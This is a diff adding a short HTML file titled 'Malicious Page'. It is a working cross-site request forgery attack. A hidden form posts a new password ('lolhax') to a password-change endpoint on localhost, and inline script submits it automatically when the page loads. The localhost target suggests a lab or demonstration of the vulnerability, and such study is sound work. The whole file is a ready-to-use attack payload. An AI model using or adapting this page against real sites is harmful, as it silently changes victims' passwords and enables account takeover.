@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Malicious Page</title>
+</head>
+<body>
+
+<form name="CSRFForm" action="http://localhost:8080/changepassword" method="POST">
+<input type="hidden" name="newPassword" value="lolhax" />
+<input type="submit"/>
+</form>
+<script>
+	document.CSRFForm.submit();
+</script>
+
+</body>
+</html>
